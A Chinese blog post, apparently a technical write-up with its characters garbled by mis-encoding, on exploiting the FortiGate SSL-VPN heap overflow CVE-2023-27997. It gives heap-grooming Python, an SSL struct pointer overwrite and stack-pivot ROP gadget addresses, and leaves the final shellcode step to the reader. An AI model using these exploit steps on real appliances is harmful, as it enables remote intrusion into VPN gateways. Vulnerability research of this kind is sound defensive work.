<h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><h3 id="åˆ©ç”¨åŸè¯­"><a href="#åˆ©ç”¨åŸè¯­" class="headerlink" title="åˆ©ç”¨åŸè¯­"></a>åˆ©ç”¨åŸè¯­</h3><p>é¦–å…ˆç¬¬ä¸€ä¸ªé—®é¢˜æ˜¯æˆ‘ä»¬æœ€ç»ˆé€‰æ‹©äº†  <code>/remote/hostcheck_validate</code>   æ¥åšæ¼æ´çš„è§¦å‘, ç”±äºæ¼æ´åˆ©ç”¨åŸå› éœ€è¦å¤šæ¬¡è¯·æ±‚, æˆ‘ä»¬å¦‚æœä½¿ç”¨äº† <code>/remote/logincheck</code>  å®¹æ˜“è§¦å‘ <code>login-attempt-limit</code> çš„é™åˆ¶, è¿™ä¸ªé»˜è®¤é™åˆ¶ä¸º 2</p>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-3c579214a9d839b632cc6a248fc70f20-30b511.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-3c579214a9d839b632cc6a248fc70f20-30b511.png" alt="image.png"></a></p>
<p>æ¥ç€å°±æ˜¯åˆ©ç”¨åŸè¯­çš„é—®é¢˜, è¿™é‡Œç›´æ¥é‡‡ç”¨äº†ä½œè€…æä¾›çš„æ–¹æ³• ^[2]</p>
<p>å¤§è‡´çš„æ ¸å¿ƒåŸç†å°±æ˜¯ä½¿ç”¨ä¸¤æ¬¡å¼‚æˆ–, è¿™æ ·å°±ä¸ä¼šè®©å‰é¢çš„æ•°å€¼å‘ç”Ÿæ··ä¹±.</p>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-96cdc2cf4791a8f7e3aae65753ebd0d8-e97ee9.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-96cdc2cf4791a8f7e3aae65753ebd0d8-e97ee9.png" alt="image.png"></a></p>
<p>å‡è®¾æˆ‘ä»¬è¦ä¿®æ”¹ 5000åç§»çš„å€¼ä¸º 0xff , . é‚£ä¹ˆæˆ‘ä»¬è¦æº¢å‡ºä¸¤æ¬¡, ç¬¬ä¸€æ¬¡å°†é•¿åº¦è®¾ç½®ä¸º 4999 , æ­¤æ—¶æº¢å‡ºç»“æŸåä¼šå°† 5000 ä½ç½®çš„å€¼å†™æˆ 0 , ç´§æ¥ç€ç¬¬äºŒæ¬¡ç”¨æˆ‘ä»¬è®¡ç®—å¥½çš„ seed  é€šè¿‡ <code>0xff ^ 0 </code>çš„æ–¹å¼ , å°†5000ä½ç½®è®¾ç½®æˆ 0xff </p>
<p>æŒ‰ç…§ä½œè€…è¯´æ˜å°±æ˜¯ï¼š</p>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-4e0284df44bd40b0e419b74bfced6499-4446fa.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-4e0284df44bd40b0e419b74bfced6499-4446fa.png" alt="image.png"></a></p>
<h3 id="å †å¸ƒå±€"><a href="#å †å¸ƒå±€" class="headerlink" title="å †å¸ƒå±€"></a>å †å¸ƒå±€</h3><p>æˆ‘ä»¬çš„ç›®æ ‡æ˜¯å»æº¢å‡ºè¦†ç›– SSL ç»“æ„ä¸­çš„ <code>handshake_func</code> æŒ‡é’ˆï¼Œ è¿™åˆ©ç”¨æ˜¯å‚è€ƒçš„ orange å½“æ—¶çš„ä¸€ä¸ªåšå®¢ ^[3]</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">SSL_do_handshake</span><span class="params">(SSL *s)</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">     s-&gt;method-&gt;ssl_renegotiate_check(s, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> (SSL_in_init(s) || SSL_in_before(s)) &#123;</span><br><span class="line">         <span class="keyword">if</span> ((s-&gt;mode &amp; SSL_MODE_ASYNC) &amp;&amp; ASYNC_get_current_job() == <span class="literal">NULL</span>) &#123;</span><br><span class="line">             <span class="class"><span class="keyword">struct</span> <span class="title">ssl_async_args</span> <span class="title">args</span>;</span></span><br><span class="line"></span><br><span class="line">             args.s = s;</span><br><span class="line"></span><br><span class="line">             ret = ssl_start_async_job(s, &amp;args, ssl_do_handshake_intern);</span><br><span class="line">         &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">             ret = s-&gt;handshake_func(s);</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> ret;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>SSL ç»“æ„ä½“å¦‚ä¸‹ ^[4]:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ssl_st</span> &#123;</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * protocol version (one of SSL2_VERSION, SSL3_VERSION, TLS1_VERSION,</span></span><br><span class="line"><span class="comment">     * DTLS1_VERSION)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">int</span> version;</span><br><span class="line">    <span class="comment">/* SSLv3 */</span></span><br><span class="line">    <span class="keyword">const</span> SSL_METHOD *method;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * There are 2 BIO&#x27;s even though they are normally both the same.  This</span></span><br><span class="line"><span class="comment">     * is so data can be read and written to different handlers</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="comment">/* used by SSL_read */</span></span><br><span class="line">    BIO *rbio;</span><br><span class="line">    <span class="comment">/* used by SSL_write */</span></span><br><span class="line">    BIO *wbio;</span><br><span class="line">    <span class="comment">/* used during session-id reuse to concatenate messages */</span></span><br><span class="line">    BIO *bbio;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * This holds a variable that indicates what we were doing when a 0 or -1</span></span><br><span class="line"><span class="comment">     * is returned.  This is needed for non-blocking IO so we know what</span></span><br><span class="line"><span class="comment">     * request needs re-doing when in SSL_accept or SSL_connect</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">int</span> rwstate;</span><br><span class="line">    <span class="keyword">int</span> (*handshake_func) (SSL *);</span><br></pre></td></tr></table></figure>


<p>é‚£è¿™çš„é—®é¢˜å°±æ˜¯è½¬åŒ–ä¸ºï¼Œ æˆ‘ä»¬å¦‚ä½•ç¨³å®šçš„å°† <code>out</code> è¿™ä¸ªç¼“å†²åŒºæ”¾ç½®åœ¨  SSL ç»“æ„ä½“çš„ç¼“å†²åŒºå‰é¢ï¼Œ è¿™æ ·æº¢å‡ºçš„æ—¶å€™æˆ‘ä»¬æ‰èƒ½è¦†ç›–åˆ°ã€‚è¿™é‡Œæˆ‘ä»¬å‚è€ƒäº†éƒ¨åˆ†ä½œè€…çš„æ€è·¯ï¼Œ åœ¨æˆ‘ä»¬è¿™ä¸ªæµ‹è¯•ç‰ˆæœ¬ä¸­ï¼Œ  SSL ç»“æ„çš„å¤§å°ä¸º 0x1db8 å­—èŠ‚ï¼Œ ä»–å°†åˆ†é…åœ¨ 0x2000  çš„ç¼“å†²åŒºå†… ã€‚ å¦å¤–æä¸€å¥è¿™é‡Œçš„å †åˆ†é…å™¨ç”¨çš„æ˜¯ jemalloc  ï¼Œ ç¬¦åˆä¸€äº›åè¿›å…ˆå‡ºçš„è§„åˆ™ï¼Œå› æ­¤æˆ‘ä»¬çš„æœ€ç»ˆæ€è·¯å¤§æ¦‚å°±æ˜¯ï¼š</p>
<p>æˆ‘ä»¬ç”¨äº† gdb è®¾ç½®å½“å‰ PC ä¸º <code>je_malloc_stats_print</code> å‡½æ•°åœ°å€ï¼Œæ‰“å°å½“å‰ <code>jemalloc</code> çš„åˆ†é…æƒ…å†µ</p>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-d1f8e940e7046fe389e9ecf78392c333-9e4181.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-d1f8e940e7046fe389e9ecf78392c333-9e4181.png" alt="image.png"></a></p>
<p>å¯ä»¥å‘ç°é»˜è®¤æƒ…å†µä¸‹ <code>0x2000</code> è¿™ä¹ˆçš„å¤§çš„å†…å­˜æ˜¯ä¸ä¼šæ€ä¹ˆä½¿ç”¨åˆ°çš„ï¼Œ å› æ­¤æˆ‘ä»¬åªéœ€è¦å…ˆåˆ†é…å‡ æ¬¡ ï¼ˆè¿™é‡Œä½¿ç”¨ 10 æ¬¡ ï¼‰åˆ†é…0x2000 çš„ bufferï¼Œç„¶åé‡Šæ”¾æ‰è®©è¿™è¿ç»­çš„å†…å­˜è¿›å…¥åˆ°é“¾è¡¨é‡Œï¼Œæ–¹ä¾¿åé¢åˆ©ç”¨çš„æ—¶å€™è®© out çš„ç¼“å†²åŒºåœ¨ ssl ç»“æ„ä½“å‰é¢ã€‚è¿™é‡Œçš„åˆ†é…åŸç†æ˜¯é€šè¿‡ä¸€ä¸ªè¯·æ±‚ç»™ä¸€ä¸ªè§£æPOSTå‚æ•°çš„ç½‘é¡µ ï¼Œ åœ¨è¿™ä¸ªè¯·æ±‚ä¸­ï¼Œå‘é€äº†POST key-valueå¯¹ï¼Œ å…¶ä¸­sizeof(key) = sizeof(struct_ssl) - 0x18 - 0x10 è€Œsizeof(value)=0 ï¼Œ ä¾‹å¦‚æˆ‘ä»¬å‘é€ä¸€ä¸ª</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;remote&#x2F;hostcheck_validate HTTP&#x2F;1.1</span><br><span class="line"></span><br><span class="line">A*(sizeof(struct_ssl) - 0x18 - 0x10)&#x3D;&amp;</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·ç†æƒ³æƒ…å†µä¸‹ä¼šåˆ†åˆ†é…ä¸€ä¸ªå¦‚ä¸‹çš„å†…å­˜ï¼š</p>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-ce0846e872e41e303b2eca5ef364df90-704e11.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-ce0846e872e41e303b2eca5ef364df90-704e11.png" alt="image.png"></a></p>
<p>æœ‰ä¸‰ä¸ª <code>AAAA</code> çš„å†…å­˜åŸå› æ˜¯åœ¨è§£æPOSTæ•°æ®çš„æ—¶å€™ï¼Œç¨‹åºä¼šè¿™ä¹ˆåšï¼šæ‹¿åˆ°æ•´ä¸ªPOSTDATAç¼“å†²åŒºï¼ˆä¾‹å¦‚a=b&amp;c=d&amp;e=fï¼‰ï¼Œç„¶åæå–å‡ºâ€™&amp;â€™ä¹‹å‰çš„å†…å®¹ï¼Œå¹¶æŠŠå®ƒå­˜å‚¨åœ¨ä¸€ä¸ªæ–°çš„å—é‡Œï¼ˆé‚£æ˜¯1ä¸ªåˆ†é…ï¼‰ã€‚ç„¶åï¼Œæ‹¿åˆ°â€™=â€™ä¹‹å‰çš„å†…å®¹ï¼Œå¹¶æŠŠå®ƒå­˜å‚¨åœ¨ä¸€ä¸ªæ–°çš„å—é‡Œï¼ˆä¸¤ä¸ªåˆ†é…ï¼‰ã€‚ç„¶åï¼Œå®ƒå°†é”®å’Œå€¼å­˜å‚¨åœ¨ä¸€ä¸ªå…¨å±€å“ˆå¸Œæ˜ å°„ä¸­ï¼Œè¿™ä¼šå¯¼è‡´äº§ç”Ÿç¬¬ä¸‰ä¸ªåˆ†é…</p>
<p>è¿™é‡Œä¸ºäº†æ–¹ä¾¿è§‚å¯Ÿåˆ†é…çš„æƒ…å†µï¼Œ æˆ‘ä»¬è¿˜å¯ä»¥ç”¨åˆ° gdb çš„commands å’Œ logging åŠŸèƒ½ã€‚å¤§è‡´å°±æ˜¯åœ¨ <code>je_malloc</code> åˆ†é…ç»“æŸåä¸‹æ–­</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;.text:0000000001776C85 E8 D6 5A CC+                call    _je_malloc</span><br><span class="line">&#x2F;&#x2F;.text:0000000001776C8A 49 89 C4                    mov     r12, rax</span><br><span class="line">break *0x1776C8A </span><br><span class="line">commands 1</span><br><span class="line">	set logging file ssl_chunk.txt</span><br><span class="line">	set logging enable on</span><br><span class="line">	p&#x2F;x $rax</span><br><span class="line">	set logging enable off</span><br><span class="line">	continue</span><br><span class="line">end</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å°½é‡è®©å…¶åˆ†é…çš„æ—¶å€™æ˜¯è¿ç»­çš„å†…å­˜ï¼š</p>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-bc72ef0094686857032b3a9e058315e3-c9a332.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-bc72ef0094686857032b3a9e058315e3-c9a332.png" alt="image.png"></a></p>
<p>å½“ç„¶åœ¨å®é™…ç¯å¢ƒä¸­å¯èƒ½æœ‰å…¶ä»–çš„å¹²æ‰°ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å¤šåˆ†é…å‡ æ¬¡ ï¼Œä¾‹å¦‚æˆ‘ä¸Šä¸ªç‰ˆæœ¬çš„åˆ©ç”¨æ˜¯åˆ†é…äº† <code>301</code> æ¬¡ï¼Œ ç„¶ååœ¨è¿™å‡ ä¸ª sock éƒ½closeæ‰è®©å…¶é‡Šæ”¾ã€‚æˆ‘è¿™éƒ¨åˆ†ä»£ç å¦‚ä¸‹ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">heap_layout</span>(<span class="params">IP, port</span>):</span></span><br><span class="line">    <span class="comment"># heap layout</span></span><br><span class="line">    payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">import</span> string</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> string.printable[:<span class="number">10</span>]:</span><br><span class="line">        payload += i*(size) + <span class="string">&#x27;=&amp;&#x27;</span></span><br><span class="line"></span><br><span class="line">    sock = make_ssl_socket(IP, port, if_warp=<span class="literal">True</span>)</span><br><span class="line">    sock = set_heap_fengshui(sock, payload)</span><br><span class="line">    sock.close()</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·ä¹‹åï¼Œæˆ‘ä»¬éœ€è¦åˆ›å»ºä¸¤ä¸ª sock  ï¼Œ ä»£ç å¦‚ä¸‹</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do_rewrtie_ssl_struct</span>(<span class="params">IP, port, salt, seeds</span>):</span></span><br><span class="line">    log.info(<span class="string">&#x27;Creating sockets...&#x27;</span>)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    vul_sock = make_ssl_socket(IP, port, if_warp=<span class="literal">True</span>)</span><br><span class="line">    sock4 = make_ssl_socket(IP, port)</span><br><span class="line">    sock4.sendall(<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    log.info(<span class="string">&#x27;Rewrite SSL struct&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> seed <span class="keyword">in</span> seeds:</span><br><span class="line">        <span class="keyword">for</span> offset <span class="keyword">in</span> seed:</span><br><span class="line">            write_value(vul_sock, salt, seed[offset].decode(<span class="string">&#x27;latin1&#x27;</span>), offset)</span><br><span class="line">    <span class="keyword">return</span> (vul_sock, sock4)</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­ä¸€ä¸ª <code>vul_sock</code> æ˜¯ç”¨æ¥æº¢å‡º buffer ï¼Œ ç„¶å sock4 æ˜¯ç”¨æ¥åˆ†é… ssl ç»“æ„ä½“ï¼Œ ç”¨æ¥è¢«æº¢å‡ºçš„ã€‚ è¿™æ ·ä¹‹åæˆ‘ä»¬å°±èƒ½ç¨³å®šè§¦å‘æº¢å‡ºï¼Œä¸”ç¨³å®šçš„è®© ssl ç»“æ„ä½“åˆ†é…åœ¨ out çš„ç¼“å†²åŒºåé¢<br>ã€‚</p>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-a4930365eb0a53489ff736eff83e0c9e-f36a67.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-a4930365eb0a53489ff736eff83e0c9e-f36a67.png" alt="image.png"></a></p>
<h3 id="æ ˆè¿ç§»"><a href="#æ ˆè¿ç§»" class="headerlink" title="æ ˆè¿ç§»"></a>æ ˆè¿ç§»</h3><p>å½“è§¦å‘æº¢å‡ºçš„æ—¶å€™ï¼Œ æˆ‘ä»¬çš„è¿™ä¸ªæ—¶å€™æŒ‡é’ˆå’Œå†…å­˜å¤§æ¦‚å¦‚ä¸‹ï¼š</p>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-4994090cd5a6c71e1d1c02b3a843fe13-a5245c.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-4994090cd5a6c71e1d1c02b3a843fe13-a5245c.png" alt="image.png"></a></p>
<p>æˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œå½“æˆ‘ä»¬æ§åˆ¶ PC  åï¼Œ è¿™é‡Œçš„ <code>RDI</code> å¯„å­˜å™¨æŒ‡å‘çš„æ˜¯æˆ‘ä»¬çš„ ssl ç»“æ„ä½“ï¼Œ å› æ­¤ç¬¬ä¸€ä¸ªæ¶Œä¸Šçš„æ€è·¯æ˜¯åšæ ˆè¿ç§»ï¼Œ æ‰¾ä¸€ä¸ªç±»ä¼¼äº</p>
<p><code>push rdi; pop rsp; ... ; ret </code> çš„ gadget å³å¯ï¼Œ æˆ‘ä»¬æœ€åä½¿ç”¨çš„æ˜¯ <code>push_rdi_pop_rsp = 0x669129 # push rdi ; pop rsp ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret</code></p>
<p>è¿™æ ·å°±å°†æ ˆæˆåŠŸè¿ç§»åˆ°äº†æˆ‘ä»¬çš„ ssl stuct ï¼Œ å³å¯æ§çš„å¯å†™çš„ç¼“å†²åŒºå†…ã€‚ ç„¶åè¿™é‡Œé¢„æœŸç›´æ¥åœ¨ ssl ç¼“å†²åŒºæ¥ç€å†™æˆ‘ä»¬å‰©ä¸‹çš„ <code>gadget</code> ï¼Œ ä½†æ˜¯è¿™é‡Œçªç„¶å‘ç°äº†ä¸€ä¸ªé—®é¢˜ï¼Œ ssl struct ä¼¼ä¹æœ‰å¾ˆå¤šç»“æ„ä½“ä¸èƒ½è¢«å†™ï¼Œ ä¸€å†™å°±æŠ¥é”™ ã€‚</p>
<p>äºæ˜¯æˆ‘åœ¨è¿™é‡Œæ¢äº†ä¸ªæ€è·¯ï¼Œ æ¥ç€å°è¯•å¸ƒå±€å †ç»“æ„ï¼Œç†æƒ³æƒ…å†µåº”è¯¥æ˜¯ï¼š</p>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-feac6e93867e3afd30cd73f00de7c7f0-2031ee.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-feac6e93867e3afd30cd73f00de7c7f0-2031ee.png" alt="image.png"></a></p>
<p>æˆ–è€…</p>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-8af32ae43ee156ed62aff6c50e7ba555-cc0cbe.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-8af32ae43ee156ed62aff6c50e7ba555-cc0cbe.png" alt="image.png"></a></p>
<p>åœ¨ out å‰é¢ ï¼Œ æˆ–è€… ssl struct çš„åé¢å¸ƒå±€ä¸€å—å®Œå…¨å¯æ§çš„å†…å­˜ï¼Œ ä½†æ˜¯ç”±äºæˆ‘ä»¬çš„è¿™å—å®Œå…¨å¯æ§çš„å†…å­˜æ˜¯ä¸èƒ½è¢« 00 æˆªæ–­çš„ï¼Œ å› æ­¤key-value å¯¹çš„  key ä¼¼ä¹æ˜¯ä¸èƒ½ç”¨æ¥å¸ƒå±€çš„ï¼Œä½†æ˜¯è¿™é‡Œæˆ‘æƒ³äº†ä¸‹ï¼Œ key ä¸èƒ½è¢«ç”¨æ¥å¸ƒå±€å †ï¼Œ ä½†æ˜¯ value åº”è¯¥æ˜¯å¯ä»¥çš„ï¼ï¼ å› æ­¤æˆ‘åœ¨æº¢å‡ºç»“æŸä¹‹åï¼Œ æ¥ç€å°è¯•ç”¨å¦‚ä¸‹ä»£ç å‘åŒ…ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">layout_gadget</span>(<span class="params">IP, port</span>):</span></span><br><span class="line">    ropchain = build_ropchain(args)</span><br><span class="line">    sock = make_ssl_socket(IP, port, if_warp=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        junk = cyclic(size, n=<span class="number">8</span>)</span><br><span class="line">        pay = bytearray(junk)</span><br><span class="line">        <span class="comment">#pay[1: 1+13 * 8] = p64(ret) * 13</span></span><br><span class="line">        <span class="comment">#pay[105:105+len(ropchain)]  = ropchain</span></span><br><span class="line">        junk = bytes(pay)</span><br><span class="line"></span><br><span class="line">        payload = <span class="string">&#x27;aaaa&#x27;</span> + <span class="string">&#x27;=&#x27;</span> + junk + <span class="string">&#x27;&amp;&#x27;</span> + <span class="string">&#x27;bbbb&#x27;</span> + <span class="string">&#x27;=&#x27;</span> + junk + <span class="string">&#x27;&amp;&#x27;</span> + <span class="string">&#x27;cccc&#x27;</span> + <span class="string">&#x27;=&#x27;</span> + junk + <span class="string">&#x27;&amp;&#x27;</span> + <span class="string">&#x27;dddd&#x27;</span> + <span class="string">&#x27;=&#x27;</span> + junk + <span class="string">&#x27;&amp;&#x27;</span> + <span class="string">&#x27;eeee&#x27;</span> + <span class="string">&#x27;=&#x27;</span> + junk </span><br><span class="line">        payload += <span class="string">&#x27;&amp;username=vvvv&#x27;</span></span><br><span class="line">        sock = set_heap_fengshui(sock, payload)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> sock</span><br></pre></td></tr></table></figure>

<p>æˆåŠŸåœ¨ out ç¼“å†²åŒºå†™ä¸‹äº†ä¸€å—å¯æ§çš„å†…å­˜</p>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-d9a69e8ee03dbce4df4a250e873625d0-092293.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-d9a69e8ee03dbce4df4a250e873625d0-092293.png" alt="image.png"></a></p>
<p>å› æ­¤æ­¤æ—¶å†…å­˜ç»“æ„å¦‚ä¸‹ï¼š</p>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-b44f04c102f10f092eb78af81e384f08-6327ef.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-b44f04c102f10f092eb78af81e384f08-6327ef.png" alt="image.png"></a></p>
<p>ç”±äº ssl struct æœ‰å¾ˆå¤šä¸èƒ½å†™çš„åœ°æ–¹ï¼Œ äºæ˜¯æˆ‘æƒ³åˆ°ä¸€ä¸ªæ–¹æ³•ï¼Œ å°è¯•å»æ‰¾å¤§é‡è¿ç»­æ˜¯ 0 çš„ç¼“å†²åŒºï¼Œ ç„¶åä»…ä»…å†™å…¥å¦å¤–ä¸€æ®µ stack pivot chainï¼Œå°†æ ˆè¿ç§»åˆ°å‰é¢çš„å¯æ§ç¼“å†²åŒºä¸­ ã€‚æœ€åæˆ‘ä½¿ç”¨äº†è¿™æ ·çš„ chain ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x000000000060bdb4   # pop rax ; pop rdx ; ret</span><br><span class="line">bss_addr &#x3D; 0x4698eb0 # -&gt; rax</span><br><span class="line">offfset &#x3D;  0x26e0-1  # rdx -&gt; ropchain</span><br><span class="line">0x61a292  # : sub rsp, rdx ; dec dword ptr [rax - 0x77] ; ret</span><br></pre></td></tr></table></figure>

<p>é€šè¿‡è¿™æ¡ chainï¼Œ å°†æ ˆè¿ç§»åˆ°å‰é¢çš„ç¼“å†²åŒºï¼Œ è¿›è¡Œæ›´å¤æ‚çš„æ“ä½œã€‚</p>
<h3 id="æ‰§è¡Œä»»æ„æŒ‡ä»¤"><a href="#æ‰§è¡Œä»»æ„æŒ‡ä»¤" class="headerlink" title="æ‰§è¡Œä»»æ„æŒ‡ä»¤"></a>æ‰§è¡Œä»»æ„æŒ‡ä»¤</h3><p>åœ¨å®Œæˆæ­¤éƒ¨åˆ†ä¹‹åï¼Œæ¥ä¸‹æ¥å°±æ˜¯ç»„è£…ROPé“¾çš„è¿‡ç¨‹äº†ã€‚å°½ç®¡è¯¥ç¨‹åºéå¸¸åºå¤§ï¼Œä»¥è‡³äºå‡ ä¹å¯ä»¥æ‰¾åˆ°æ‰€éœ€çš„ä»»ä½•gadgeté“¾ï¼Œä½†æ‰¾å¯»gadgetç»ˆç©¶æ˜¯ä¸€ä¸ªç›¸å¯¹ç¹ççš„ä»»åŠ¡ã€‚å› æ­¤ï¼Œæœ€åå†³å®šé‡‡ç”¨mprotect + shellcodeçš„æ–¹æ³•ã€‚é¦–å…ˆï¼Œåˆ©ç”¨ä¸€äº›gadgetå°†rdiæŒ‡å‘ROPé“¾çš„å†…å­˜å¼€å¤´ã€‚</p>
<p>è¿™ä¸€éƒ¨åˆ†å†…å®¹å°±ç•™ä½œç»™è¯»è€…å®Œæˆå§</p>
<h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><h2 id="Reference-link"><a href="#Reference-link" class="headerlink" title="Reference link"></a>Reference link</h2><p>^[1]   <a href="https://labs.watchtowr.com/xortigate-or-cve-2023-27997/">https://labs.watchtowr.com/xortigate-or-cve-2023-27997/</a><br>^[2]  <a href="https://blog.lexfo.fr/xortigate-cve-2023-27997.html">https://blog.lexfo.fr/xortigate-cve-2023-27997.html</a><br>^[3] <a href="https://devco.re/blog/2019/08/09/attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn/#:~:text=The%20crash%20happened%20in">attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn</a><br>^[4] <a href="https://github.dev/openssl/openssl/tree/openssl-3.0.0%E2%89%A5">https://github.dev/openssl/openssl/tree/openssl-3.0.0â‰¥</a></p>
</div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
        var options = {
            selector: '.gallery-item'
        };
